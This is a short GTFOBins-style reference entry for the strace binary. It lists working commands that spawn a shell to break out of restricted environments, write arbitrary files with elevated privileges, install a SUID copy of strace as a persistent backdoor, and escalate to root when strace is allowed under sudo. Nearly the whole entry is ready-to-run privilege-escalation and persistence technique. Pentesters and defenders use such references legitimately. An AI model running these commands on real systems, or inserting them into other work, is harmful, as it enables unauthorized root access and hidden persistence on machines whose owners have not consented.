# GTFOBin: strace

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
strace -o /dev/null /bin/sh
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

The data to be written appears amid the syscall log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever syscall passing arbitrary data can be used in place of `strace - DATA`.

```
LFILE=file_to_write
strace -s 999 -o $LFILE strace - DATA
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which strace) .

./strace -o /dev/null /bin/sh -p
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo strace -o /dev/null /bin/sh
```